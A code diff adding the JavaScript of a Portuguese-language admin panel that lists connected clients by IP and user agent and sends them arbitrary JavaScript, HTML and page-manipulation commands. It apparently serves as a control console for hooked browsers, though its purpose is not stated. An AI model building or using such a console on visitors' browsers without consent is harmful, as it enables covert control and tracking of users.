+                        data.content = document.getElementById('manipulation-content').value;
+                        if (!data.target_id.trim()) {
+                            throw new Error("ID do elemento é obrigatório");
+                        }
+                        if (!data.content.trim()) {
+                            throw new Error("O conteúdo a ser manipulado não pode estar vazio");
+                        }
+                        break;
+                        
+                    case 'visibility':
+                        data.target_id = document.getElementById('visibility-element').value;
+                        const radioChecked = document.querySelector('input[name="visibility"]:checked');
+                        if (!radioChecked) {
+                            throw new Error("Selecione uma opção de visibilidade");
+                        }
+                        data.content = radioChecked.value;
+                        if (!data.target_id.trim()) {
+                            throw new Error("ID do elemento é obrigatório");
+                        }
+                        break;
+
+                    case 'head':
+                        data.action = document.getElementById('head-action').value;
+                        data.content = document.getElementById('head-content').value;
+                        if (!data.content.trim()) {
+                            throw new Error("O conteúdo para o head não pode estar vazio");
+                        }
+                        break;
+                }
+                
+                statusElement.textContent = `Enviando comando ${type}...`;
+                statusElement.className = '';
+                
+                fetch('/admin/set_command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.success) {
+                        statusElement.textContent = `Comando enviado com sucesso às ${new Date().toLocaleTimeString()}`;
+                        statusElement.className = 'connected';
+                        
+                        // Update logs if we're on logs page
+                        if (document.getElementById('logs-page').classList.contains('active')) {
+                            refreshLogs();
+                        }
+                        
+                        // Update command count on dashboard
+                        if (document.getElementById('dashboard-page').classList.contains('active')) {
+                            const commandCount = document.getElementById('total-commands');
+                            commandCount.textContent = parseInt(commandCount.textContent) + 1;
+                        }
+                    } else {
+                        throw new Error(data.error || "Erro no servidor ao processar comando");
+                    }
+                })
+                .catch(error => {
+                    statusElement.textContent = `Erro ao enviar comando: ${error.message}`;
+                    statusElement.className = 'error';
+                });
+            } catch (error) {
+                statusElement.textContent = `Erro: ${error.message}`;
+                statusElement.className = 'error';
+            }
+        }
+        
+        function previewCommand(type) {
+            const previewPanel = document.getElementById('preview-panel');
+            const previewContent = document.getElementById('preview-content');
+            
+            try {
+                let content = '';
+                
+                switch(type) {
+                    case 'js':
+                        const jsCode = document.getElementById('js-command').value;
+                        if (!jsCode.trim()) throw new Error("Nenhum código para visualizar");
+                        content = `<pre class="m-0">${escapeHtml(jsCode)}</pre>`;
+                        break;
+                        
+                    case 'html':
+                        const htmlCode = document.getElementById('html-content').value;
+                        if (!htmlCode.trim()) throw new Error("Nenhum HTML para visualizar");
+                        content = `
+                            <div>
+                                <div class="mb-3">
+                                    <strong><i class="fas fa-code me-1"></i>Código HTML:</strong>
+                                    <pre class="mt-2">${escapeHtml(htmlCode)}</pre>
+                                </div>
+                                <div>
+                                    <strong><i class="fas fa-eye me-1"></i>Visualização:</strong>
+                                    <div class="preview-render p-3 border mt-2">${htmlCode}</div>
+                                </div>
+                            </div>
+                        `;
+                        break;
+                        
+                    case 'manipulate':
+                        const targetElement = document.getElementById('target-element').value;
+                        const actionType = document.getElementById('action-type').value;
+                        const manipContent = document.getElementById('manipulation-content').value;
+                        
+                        if (!targetElement.trim() || !manipContent.trim()) {
+                            throw new Error("ID do elemento e conteúdo são obrigatórios");
+                        }
+                        
+                        content = `
+                            <div>
+                                <div class="mb-3">
+                                    <strong><i class="fas fa-crosshairs me-1"></i>Elemento alvo:</strong> 
+                                    <code class="ms-2">#${escapeHtml(targetElement)}</code>
+                                </div>
+                                <div class="mb-3">
+                                    <strong><i class="fas fa-tools me-1"></i>Ação:</strong>
+                                    <span class="ms-2">${actionType}</span>
+                                </div>
+                                <div class="mb-3">
+                                    <strong><i class="fas fa-edit me-1"></i>Conteúdo:</strong>
+                                    <pre class="mt-2">${escapeHtml(manipContent)}</pre>
+                                </div>
+                                <div>
+                                    <strong><i class="fas fa-eye me-1"></i>Visualização:</strong>
+                                    <div class="preview-render p-3 border mt-2">${manipContent}</div>
+                                </div>
+                            </div>
+                        `;
+                        break;
+                        
+                    case 'head':
+                        const headAction = document.getElementById('head-action').value;
+                        const headContent = document.getElementById('head-content').value;
+                        
+                        if (!headContent.trim()) {
+                            throw new Error("Conteúdo é obrigatório");
+                        }
+                        
+                        content = `
+                            <div>
+                                <div class="mb-3">
+                                    <strong><i class="fas fa-code me-1"></i>Tipo:</strong> 
+                                    <span class="ms-2">${headAction}</span>
+                                </div>
+                                <div>
+                                    <strong><i class="fas fa-file-code me-1"></i>Conteúdo:</strong>
+                                    <pre class="mt-2">${escapeHtml(headContent)}</pre>
+                                </div>
+                            </div>
+                        `;
+                        break;
+                }
+                
+                previewContent.innerHTML = content;
+                previewPanel.style.display = 'block';
+                
+                // Scroll to preview
+                previewPanel.scrollIntoView({behavior: "smooth"});
+            } catch (error) {
+                alert("Erro de preview: " + error.message);
+            }
+        }
+
+        // Client functions
+        function refreshClients() {
+            fetch('/admin/clients')
+                .then(response => response.json())
+                .then(data => {
+                    const clientsTable = document.getElementById('clients-table');
+                    const tableBody = clientsTable.querySelector('tbody');
+                    
+                    // Counts for stats display
+                    let websocketCount = 0;
+                    let pollingCount = 0;
+                    let clientRowsHtml = [];
+                    
+                    if (data.clients && data.clients.length > 0) {
+                        // Sort clients: online first, then by last activity
+                        data.clients.sort((a, b) => {
+                            if (a.active !== b.active) return a.active ? -1 : 1;
+                            return new Date(b.last_seen) - new Date(a.last_seen);
+                        });
+                        
+                        // Generate HTML for all client rows
+                        data.clients.forEach(client => {
+                            // Update counts
+                            if (client.active) {
+                                client.websocket ? websocketCount++ : pollingCount++;
+                            }
+                            
+                            const rowHtml = `
+                                <tr class="${client.active ? (client.websocket ? 'table-primary' : '') : 'table-secondary'}" 
+                                    data-client-id="${client.id}" 
+                                    data-client-status="${client.active ? 'online' : 'offline'}"
+                                    data-client-connection="${client.websocket ? 'websocket' : 'polling'}"
+                                    data-last-seen="${client.last_seen}">
+                                    <td>
+                                        <div class="status-tooltip" title="Última atividade: ${new Date(client.last_seen).toLocaleString()}">
+                                            <span class="client-status ${client.active ? 'status-online' : 'status-offline'}"></span>
+                                            ${client.active ? 'ON' : 'OFF'}
+                                        </div>
+                                    </td>
+                                    <td>
+                                        <div class="client-id">
+                                            <code>${client.id}</code>
+                                        </div>
+                                    </td>
+                                    <td>${new Date(client.last_seen).toLocaleString()}</td>
+                                    <td>${client.ip || 'N/A'}</td>
+                                    <td>
+                                        <div class="browser-cell" title="${client.user_agent || 'N/A'}">
+                                            <i class="fas fa-globe me-1"></i>${parseUserAgent(client.user_agent).browser}
+                                        </div>
+                                    </td>
+                                    <td>
+                                        <div class="os-cell" title="${client.user_agent || 'N/A'}">
+                                            <i class="fas fa-desktop me-1"></i>${parseUserAgent(client.user_agent).os}
+                                        </div>
+                                    </td>
+                                    <td>
+                                        ${client.websocket 
+                                            ? '<span class="badge badge-websocket"><i class="fas fa-bolt me-1"></i>WebSocket</span>' 
+                                            : '<span class="badge badge-polling"><i class="fas fa-sync me-1"></i>Polling</span>'}
+                                    </td>
+                                    <td>
+                                        <div class="d-flex gap-2">
+                                            <button onclick="targetClient('${client.id}')" class="action-btn">
+                                                <i class="fas fa-terminal"></i>
+                                                <span class="tooltip-action">Selecionar Cliente</span>
+                                            </button>
+                                            <button onclick="removeClient('${client.id}')" class="action-btn delete">
+                                                <i class="fas fa-trash-alt"></i>
+                                                <span class="tooltip-action">Remover Cliente</span>
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+                            `;
+                            
+                            clientRowsHtml.push(rowHtml);
+                        });
+                        
+                        // Verificar se temos sistema de paginação
+                        if (window.TablePagination) {
+                            // Encontrar instância de paginação para esta tabela ou criar uma nova
+                            const paginationInstance = Object.values(window).find(
+                                obj => obj instanceof TablePagination && obj.tableId === 'clients-table'
+                            );
+                            
+                            if (paginationInstance) {
+                                // Apenas atualize os dados da tabela via sistema de paginação
+                                paginationInstance.updateData(clientRowsHtml);
+                            } else {
+                                // Fallback para o método padrão
+                                tableBody.innerHTML = clientRowsHtml.join('');
+                                // Inicialize a paginação
+                                new TablePagination('clients-table', { rowsPerPage: 10 });
+                            }
+                        } else {
+                            // Se não tiver paginação, apenas atualize a tabela normalmente
+                            tableBody.innerHTML = clientRowsHtml.join('');
+                        }
+                        
+                        // Update stats display
+                        document.getElementById('websocket-count').textContent = websocketCount;
+                        document.getElementById('polling-count').textContent = pollingCount;
+                        
+                        // Adiciona efeito de atualização aos contadores
+                        ['websocket-count', 'polling-count'].forEach(id => {
+                            const counter = document.getElementById(id);
+                            counter.style.color = 'var(--accent-color)';
+                            counter.style.textShadow = '0 0 5px var(--accent-color)';
+                            
+                            setTimeout(() => {
+                                counter.style.color = '';
+                                counter.style.textShadow = '';
+                                counter.style.transition = 'all 0.5s ease';
+                            }, 1000);
+                        });
+                        
+                        // Update client dropdown
+                        updateClientDropdown(data.clients);
+                    } else {
+                        tableBody.innerHTML = '<tr><td colspan="7" class="text-center">Nenhum cliente encontrado.</td></tr>';
+                        document.getElementById('websocket-count').textContent = '0';
+                        document.getElementById('polling-count').textContent = '0';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading clients:', error);
+                    document.querySelector('#clients-table tbody').innerHTML = 
+                        '<tr><td colspan="7" class="text-center text-danger">Erro ao carregar clientes: ' + error.message + '</td></tr>';
+                });
+        }
+        
+        function updateClientDropdown(clients) {
+            const dropdown = document.getElementById('target-client');
+            
+            // Keep default option
+            const defaultOption = dropdown.options[0];
+            dropdown.innerHTML = '';
+            dropdown.appendChild(defaultOption);
+            
+            // Add clients
+            clients.forEach(client => {
+                const option = document.createElement('option');
+                option.value = client.id;
+                
+                const status = client.active ? 'online' : 'offline';
+                const connection = client.websocket ? '⚡' : '';
+                option.textContent = `Cliente: ${client.id.substring(0, 8)}... (${status}) ${connection}`;
+                
+                if (!client.active) {
+                    option.disabled = true;
+                }
+                
+                dropdown.appendChild(option);
+            });
+            
+            // Adicionar event listener para o dropdown, se ainda não tiver sido adicionado
+            if (!dropdown.hasAttribute('data-has-listener')) {
+                dropdown.addEventListener('change', updateSelectedClientInfo);
+                dropdown.setAttribute('data-has-listener', 'true');
+            }
+            
+            // Atualiza as informações do cliente inicialmente
+            updateSelectedClientInfo();
+        }
+        
+        // Função para atualizar as informações do cliente selecionado
+        function updateSelectedClientInfo() {
+            const dropdown = document.getElementById('target-client');
+            const clientInfoSection = document.getElementById('client-info-section');
+            
+            // Se o valor for default, esconde a seção de informações
+            if (dropdown.value === 'default') {
+                clientInfoSection.classList.add('d-none');
+                return;
+            }
+            
+            // Busca os detalhes do cliente pelo ID
+            fetch(`/admin/client/${dropdown.value}`)
+                .then(response => response.json())
+                .then(client => {
+                    if (client) {
+                        // Preenche as informações do cliente
+                        document.getElementById('info-client-id').textContent = client.id;
+                        document.getElementById('info-client-status').textContent = client.active ? 'Online' : 'Offline';
+                        document.getElementById('info-client-status').className = client.active ? 'text-success' : 'text-danger';
+                        document.getElementById('info-client-ip').textContent = client.ip || 'N/A';
+                        document.getElementById('info-client-last-activity').textContent = 
+                            client.last_activity ? new Date(client.last_activity).toLocaleString() : 'N/A';
+                        document.getElementById('info-client-connection').textContent = client.websocket ? 'WebSocket ⚡' : 'Polling';
+                        document.getElementById('info-client-connection').className = client.websocket ? 'text-accent' : '';
+                        
+                        // Detalhes de plataforma (navegador e sistema operacional)
+                        const userAgent = client.user_agent || 'N/A';
+                        const parsedUA = parseUserAgent(userAgent);
+                        document.getElementById('info-client-browser').textContent = parsedUA.browser;
+                        document.getElementById('info-client-os').textContent = parsedUA.os;
+                        document.getElementById('info-client-agent').textContent = userAgent;
+                        
+                        // Oculta os detalhes do User-Agent inicialmente
+                        document.getElementById('user-agent-details').classList.add('d-none');
+                        document.getElementById('show-user-agent').textContent = 'Ver User-Agent completo';
+                        
+                        // Exibe a seção de informações
+                        clientInfoSection.classList.remove('d-none');
+                    } else {
+                        clientInfoSection.classList.add('d-none');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro ao buscar informações do cliente:', error);
+                    clientInfoSection.classList.add('d-none');
+                });
+        }
+        
+        // Função para selecionar um cliente-alvo para comandos
+        function targetClient(clientId) {
+            console.log('Selecionando cliente:', clientId);
+            
+            // Assegurar que o dropdown está atualizado antes de selecionar o cliente
+            fetch('/admin/clients')
+                .then(response => response.json())
+                .then(data => {
+                    // Atualiza o dropdown com os clientes mais recentes
+                    updateClientDropdown(data.clients);
+                    
+                    // Seleciona o cliente no dropdown
+                    const dropdown = document.getElementById('target-client');
+                    if (dropdown) {
+                        dropdown.value = clientId;
+                        
+                        // Se o valor não foi definido corretamente, significa que o cliente não está na lista
+                        if (dropdown.value !== clientId) {
+                            // Adiciona o cliente manualmente ao dropdown
+                            const client = data.clients.find(c => c.id === clientId);
+                            if (client) {
+                                const option = document.createElement('option');
+                                option.value = client.id;
+                                const status = client.active ? 'online' : 'offline';
+                                const connection = client.websocket ? '⚡' : '';
+                                option.textContent = `Cliente: ${client.id.substring(0, 8)}... (${status}) ${connection}`;
+                                dropdown.appendChild(option);
+                                dropdown.value = clientId;
+                            }
+                        }
+                        
+                        // Atualiza a interface
+                        const selectedClientIdElement = document.getElementById('selected-client-id');
+                        if (selectedClientIdElement) {
+                            selectedClientIdElement.textContent = clientId.substring(0, 8) + '...';
+                            selectedClientIdElement.title = clientId; // Adiciona tooltip com ID completo
+                        }
+                        
+                        const clientSelectorElement = document.getElementById('client-selector');
+                        if (clientSelectorElement) {
+                            clientSelectorElement.classList.remove('d-none');
+                        }
+                        
+                        // Atualiza as informações do cliente selecionado
+                        updateSelectedClientInfo();
+                    }
+                    
+                    // Remove seleção de todas as linhas de todas as tabelas
+                    document.querySelectorAll('tr.client-selected, tr.selected').forEach(r => {
+                        r.classList.remove('client-selected', 'selected');
+                        // Limpa quaisquer estilos inline para evitar problemas de layout
+                        r.style.boxShadow = '';
+                        r.style.borderLeft = '';
+                    });
+                    
+                    // Destacar este cliente em todas as tabelas (USAR APENAS CLASSES, NÃO ESTILOS INLINE)
+                    document.querySelectorAll(`tr[data-client-id="${clientId}"]`).forEach(row => {
+                        // Reset das classes para garantir consistência
+                        row.className = row.className.replace(/\bselected\b|\bclient-selected\b/g, '').trim();
+                        
+                        // Readiciona as classes limpas - mantendo as classes originais da tabela
+                        const baseClasses = row.classList.contains('table-primary') ? 'table-primary' : 
+                                            row.classList.contains('table-secondary') ? 'table-secondary' : '';
+                                            
+                        // Adiciona client-selected a todas as instâncias
+                        row.className = `${baseClasses} client-selected`.trim();
+                    });
+                    
+                    // Adiciona a classe 'selected' apenas à primeira instância encontrada
+                    const firstInstance = document.querySelector(`tr[data-client-id="${clientId}"]`);
+                    if (firstInstance) {
+                        // Garante que a classe está sendo adicionada corretamente sem espaçamento extra
+                        firstInstance.classList.add('selected');
+                    }
+                    
+                    // Navigate to commands page if not already there
+                    const currentPage = document.querySelector('.content-page.active');
+                    if (currentPage && currentPage.id !== 'commands-page') {
+                        const commandsMenuItem = document.querySelector('.menu-item[data-page="commands"]');
+                        if (commandsMenuItem) {
+                            commandsMenuItem.click();
+                        }
+                    }
+                    
+                    // Feedback visual para o usuário
+                    showNeonToast(`Cliente ${clientId.substring(0, 8)}... selecionado`, 'success', 2000);
+                })
+                .catch(error => {
+                    console.error('Erro ao buscar cliente:', error);
+                    showNeonToast('Erro ao selecionar cliente', 'error');
+                });
+        }
+        
+        function clearClientSelection() {
+            document.getElementById('target-client').value = 'default';
+            document.getElementById('client-selector').classList.add('d-none');
+        }
+        
+        function removeClient(clientId) {
+            if (confirm(`Tem certeza que deseja remover o cliente ${clientId}?`)) {
+                fetch(`/admin/clients/${clientId}`, {
+                    method: 'DELETE'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        // If the client was selected, clear the selection
+                        if (document.getElementById('target-client').value === clientId) {
+                            clearClientSelection();
+                        }
+                        
+                        // Refresh clients list
+                        refreshClients();
+                        
+                        // Update dashboard if we're on it
+                        if (document.getElementById('dashboard-page').classList.contains('active')) {
+                            refreshDashboard();
+                        }
+                    } else {
+                        alert(`Erro ao remover cliente: ${data.error}`);
+                    }
+                })
+                .catch(error => {
+                    alert(`Erro ao remover cliente: ${error.message}`);
+                });
+            }
+        }
+
+        /**
+         * Atualiza todas as tabelas de clientes no dashboard e na página de clientes
+         */
+        function refreshClientsTables() {
+            // Exibe um indicador de carregamento
+            showNeonToast("Atualizando dados dos clientes...", "info", 1000);
+            
+            // Atualiza a lista principal de clientes na página de clientes
+            refreshClients();
+            
+            // Atualiza o dashboard de clientes
+            fetchDashboardClients();
+            
+            // Atualiza os contadores e estatísticas
+            fetchClientStats();
+            
+            // Atualiza também os logs que podem conter informações dos clientes
+            if (typeof refreshLogs === 'function') {
+                refreshLogs();
+            }
+            
+            // Preserva a seleção do cliente atual após a atualização
+            const selectedClientId = document.getElementById('target-client')?.value;
+            if (selectedClientId && selectedClientId !== 'default') {
+                // Pequeno delay para garantir que as tabelas foram atualizadas
+                setTimeout(() => {
+                    // Seleciona novamente o cliente para preservar o estado
+                    document.querySelectorAll(`tr[data-client-id="${selectedClientId}"]`).forEach(row => {
+                        row.classList.add('client-selected');
+                    });
+                }, 500);
+            }
+            
+            // Mostra feedback visual para o usuário
+            setTimeout(() => {
+                showNeonToast("Tabelas de clientes atualizadas", "success", 2000);
+            }, 1000);
+        }
+
+        // Funções para compatibilidade com o console-terminal.js
+        function getCommandTypeBadge(type) {
+            switch(type) {
+                case 'js': return 'badge-bg-danger';
+                case 'html': return 'badge-bg-primary';
+                case 'manipulate': return 'badge-bg-success';
+                case 'visibility': return 'badge-bg-warning';
+                case 'head': return 'badge-bg-info';
+                default: return 'badge-bg-secondary';
+            }
+        }
+    </script>
+</body>
+</html>
